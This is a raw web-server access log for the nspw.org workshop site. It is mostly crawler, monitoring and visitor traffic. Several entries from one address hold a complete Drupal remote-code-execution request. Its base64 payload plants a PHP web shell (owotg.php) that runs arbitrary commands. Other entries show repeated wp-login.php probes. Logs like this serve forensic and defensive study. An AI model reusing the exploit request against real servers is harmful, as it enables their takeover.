59.124.153.166 - - [30/Apr/2018:13:54:20 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
69.162.124.227 - - [30/Apr/2018:13:55:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:13:57:37 -0400] "GET /2009/proceedings/1998/nspw1998-chang.pdf HTTP/1.1" 200 679126 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
79.112.10.138 - - [30/Apr/2018:13:58:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.112.10.138 - - [30/Apr/2018:13:58:04 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.227.208.179 - - [30/Apr/2018:13:58:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.227.208.179 - - [30/Apr/2018:13:58:46 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.155 - - [30/Apr/2018:13:59:20 -0400] "GET /papers/1996/?C=M;O=D HTTP/1.1" 200 8163 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [30/Apr/2018:14:00:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
71.6.167.142 - - [30/Apr/2018:14:00:23 -0400] "GET / HTTP/1.1" 200 11587 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
71.6.167.142 - - [30/Apr/2018:14:00:28 -0400] "" 400 3412 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:00:31 -0400] "" 400 3428 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:00:34 -0400] "" 400 3406 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:00:41 -0400] "" 400 3406 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:00:44 -0400] "" 400 3406 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:00:59 -0400] "GET /robots.txt HTTP/1.1" 200 5907 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:01:10 -0400] "GET /sitemap.xml HTTP/1.1" 404 7970 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:01:16 -0400] "GET /.well-known/security.txt HTTP/1.1" 404 4064 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:01:19 -0400] "" 400 3848 "-" "-"
71.6.167.142 - - [30/Apr/2018:14:02:04 -0400] "-" 408 3422 "-" "-"
66.249.73.89 - - [30/Apr/2018:14:02:09 -0400] "GET /2005/oc.content HTTP/1.1" 200 6198 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:06:25 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [30/Apr/2018:14:06:43 -0400] "GET /2009/proceedings/1996/nspw1996-wulf.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:14:06:36 -0400] "GET /papers/1999/nspw1999-lipson.pdf HTTP/1.1" 200 653305 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
89.142.129.62 - - [30/Apr/2018:14:07:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.142.129.62 - - [30/Apr/2018:14:07:48 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.255.250.67 - - [30/Apr/2018:14:07:12 -0400] "GET /papers/1999/nspw1999-lipson.pdf HTTP/1.1" 200 653305 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.45 - - [30/Apr/2018:14:07:56 -0400] "GET /2003/dates.shtml HTTP/1.1" 200 4960 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.81.128 - - [30/Apr/2018:14:07:59 -0400] "GET /2009/proceedings/2009/?C=M;O=D HTTP/1.1" 200 4396 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.124 - - [30/Apr/2018:14:08:25 -0400] "GET /papers/2010/nspw2010-bratus.pdf HTTP/1.1" 200 457283 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
40.77.167.129 - - [30/Apr/2018:14:09:49 -0400] "GET /papers/2012/docs/p67.pdf HTTP/1.1" 200 658844 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [30/Apr/2018:14:11:16 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
179.222.90.221 - - [30/Apr/2018:14:12:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.222.90.221 - - [30/Apr/2018:14:12:38 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:14:13:17 -0400] "GET /2014/local HTTP/1.1" 200 7525 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:14:13:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:14:13:57 -0400] "GET /papers/2010/?C=N;O=A HTTP/1.1" 200 4364 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:14:14:44 -0400] "GET /2009/proceedings/2006/nspw2006-locasto.pdf HTTP/1.1" 200 166291 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:14:14:55 -0400] "GET /2006/invite/local.html HTTP/1.1" 200 795 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:14:15:01 -0400] "GET /2005/cfp2005.pdf HTTP/1.1" 200 68262 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:14:15:50 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:14:15:17 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 200 610930 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
196.55.2.4 - - [30/Apr/2018:14:17:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7835 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.55.2.4 - - [30/Apr/2018:14:17:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.67.240.36 - - [30/Apr/2018:14:17:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.67.240.36 - - [30/Apr/2018:14:17:38 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:14:18:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.204 - - [30/Apr/2018:14:18:48 -0400] "GET /2006/ HTTP/1.1" 200 5823 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.129 - - [30/Apr/2018:14:19:54 -0400] "GET /2006/NSPWtrans.gif HTTP/1.1" 200 12812 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.124.153.166 - - [30/Apr/2018:14:20:14 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:14:20:14 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
66.249.73.91 - - [30/Apr/2018:14:20:23 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 200 904662 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.234.7.19 - - [30/Apr/2018:14:21:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.234.7.19 - - [30/Apr/2018:14:21:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:14:22:41 -0400] "GET /2009/proceedings/1998/nspw1998-lin.pdf HTTP/1.1" 200 336758 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:23:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.204 - - [30/Apr/2018:14:23:42 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 667405 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.204 - - [30/Apr/2018:14:24:00 -0400] "GET /papers/2000/nspw2000-kahn.pdf HTTP/1.1" 200 593367 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.87 - - [30/Apr/2018:14:24:56 -0400] "GET /2003/oc.html HTTP/1.1" 404 7996 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
39.40.87.81 - - [30/Apr/2018:14:25:47 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [30/Apr/2018:14:26:03 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
189.0.197.128 - - [30/Apr/2018:14:27:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.0.197.128 - - [30/Apr/2018:14:27:22 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:14:27:37 -0400] "GET /2009/proceedings/2001/?C=N;O=A HTTP/1.1" 200 4418 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.34 - - [30/Apr/2018:14:28:04 -0400] "GET /papers/2012/docs/p115.pdf HTTP/1.1" 200 841774 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.113 - - [30/Apr/2018:14:28:04 -0400] "GET /papers/2005/nspw2005-mchugh.pdf HTTP/1.1" 200 518127 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:14:28:41 -0400] "GET /2009/proceedings/2010/nspw2010-faily.pdf HTTP/1.1" 200 539853 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:28:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:14:29:11 -0400] "GET /2009/proceedings/2005/nspw2005-flechais.pdf HTTP/1.1" 200 2796418 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:14:29:30 -0400] "GET /2009/proceedings/2007/nspw2007-frontmatter.pdf HTTP/1.1" 200 658204 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.113 - - [30/Apr/2018:14:27:44 -0400] "GET /2009/proceedings/2009/nspw2009-gibson.pdf HTTP/1.1" 200 3916249 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /2016 HTTP/1.1" 200 6980 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1182 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 903 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:30:59 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:00 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:01 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.237.147.32 - - [30/Apr/2018:14:31:06 -0400] "GET /2016/cfp HTTP/1.1" 200 5320 "https://www.nspw.org/2016" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
199.16.157.181 - - [30/Apr/2018:14:31:29 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
187.23.30.146 - - [30/Apr/2018:14:32:09 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.23.30.146 - - [30/Apr/2018:14:32:10 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.139 - - [30/Apr/2018:14:32:40 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 200 3845 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [30/Apr/2018:14:33:39 -0400] "GET /robots.txt HTTP/1.1" 200 4504 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:33:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:14:34:03 -0400] "GET /papers/1993/nspw1993-gomez.pdf HTTP/1.1" 200 800204 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:14:38:38 -0400] "GET /papers/2008/nspw2008 HTTP/1.1" 404 8039 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:38:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.204 - - [30/Apr/2018:14:39:40 -0400] "GET /papers/2008/nspw2008-crandall.pdf HTTP/1.1" 200 425589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [30/Apr/2018:14:43:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
40.77.167.129 - - [30/Apr/2018:14:43:41 -0400] "GET /papers/1993/nspw1993-shockley.pdf HTTP/1.1" 200 794328 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.204 - - [30/Apr/2018:14:45:33 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 200 226793 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.124.153.166 - - [30/Apr/2018:14:46:10 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:14:46:10 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
103.42.210.163 - - [30/Apr/2018:14:46:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.42.210.163 - - [30/Apr/2018:14:46:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:14:47:45 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:14:48:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [30/Apr/2018:14:50:04 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
157.55.39.204 - - [30/Apr/2018:14:50:34 -0400] "GET /papers/2010/nspw2010-parkin.pdf HTTP/1.1" 200 921319 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:14:52:17 -0400] "GET /2005/program.shtml HTTP/1.1" 200 8288 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [30/Apr/2018:14:52:46 -0400] "GET /2009/proceedings/2005/nspw2005-bishop-pos.pdf HTTP/1.1" 200 609126 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
